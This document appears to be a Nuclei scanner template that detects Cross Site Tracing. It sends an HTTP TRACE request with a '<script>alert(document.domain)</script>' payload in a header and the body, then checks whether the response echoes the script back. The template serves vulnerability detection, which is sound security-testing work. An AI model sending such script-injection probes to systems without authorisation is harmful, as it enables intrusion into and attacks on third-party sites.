id: cross-site-tracing-xss

info:
  name: 跨站追踪引发的跨站脚本漏洞
  author: ritikchaddha
  severity: low
  description: Cross Site Tracing - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://medium.com/@tushar_rs_/cross-site-tracing-attack-xst-5aa519658b7a
    - https://www.owasp.org/index.php/Cross_Site_Tracing
  classification:
    cwe-id: CWE-80
  metadata:
    max-request: 1
  tags: xss,trace,generic

http:
  - raw:
      - |
        TRACE / HTTP/1.1
        Host: {{Hostname}}
        Header: <script>alert(document.domain)</script>
        Content-Length: 27

        <script>alert(document.domain)</script>

    matchers-condition: and
    matchers:
      - type: word
        part: response
        words:
          - "Header: <script>alert(document.domain)</script>"
          - "TRACE"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"
          - "message/http"

      - type: status
        status:
          - 200
